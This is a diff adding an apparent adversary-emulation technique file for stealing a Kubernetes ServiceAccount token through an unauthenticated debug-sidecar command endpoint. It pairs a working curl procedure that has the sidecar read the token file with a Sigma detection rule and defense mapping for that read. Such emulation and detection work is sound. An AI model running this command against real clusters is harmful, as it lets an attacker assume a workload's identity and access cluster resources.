@@ -1,0 +1,58 @@
+name: Steal SA Token via Debug Sidecar
+description: >
+  A debug/telemetry sidecar shipped in the target pod exposes an
+  unauthenticated command endpoint (/api/run) and shares the pod's
+  ServiceAccount token mount. Read the token through the sidecar to assume the
+  workload's Kubernetes identity. Hardening the main container does not help:
+  the sidecar next to it holds the same token.
+tactic: Credential Access
+techniques: ["Steal Application Access Token", "T1528"]
+parameters:
+  TARGET:
+    type: string
+    default: "${TARGET.IP}"
+    description: >
+      host/IP of the debug sidecar - a node IP if reached via NodePort, or the
+      Service/pod IP if run from an in-cluster foothold.
+  PORT:
+    type: int
+    default: 8099
+    description: the sidecar's /api/run port
+procedures:
+  - key: curl
+    command: |
+      curl -sS --max-time 15 http://${TARGET}:${PORT}/api/run \
+        -H 'Content-Type: application/json' \
+        -d '{"cmd":"cat /var/run/secrets/kubernetes.io/serviceaccount/token"}' \
+        | jq -r '.output'
+preconditions:
+  kind: System
+effects:
+  - rawServiceaccountToken
+cleanup:
+  command: "true"
+  description: nothing to clean up - this only reads a token
+defense:
+  id: D3-PM
+  name: Platform Monitoring
+  url: https://d3fend.mitre.org/technique/d3f:PlatformMonitoring/
+  sigma:
+    title: ServiceAccount token read inside a sidecar container
+    status: experimental
+    description: >
+      A process in an observability/debug sidecar reads the mounted
+      ServiceAccount token. Because sidecars share the pod's token, this is a
+      common identity-theft path. Caught at runtime (eBPF - Kubescape/Falco),
+      not in the Kubernetes audit log: the read never reaches the API server.
+    logsource:
+      category: process_creation
+      product: linux
+    detection:
+      selection:
+        CommandLine|contains: '/var/run/secrets/kubernetes.io/serviceaccount/token'
+      condition: selection
+    falsepositives:
+      - A workload legitimately reading its own token at startup
+    level: medium
+references:
+  - https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/
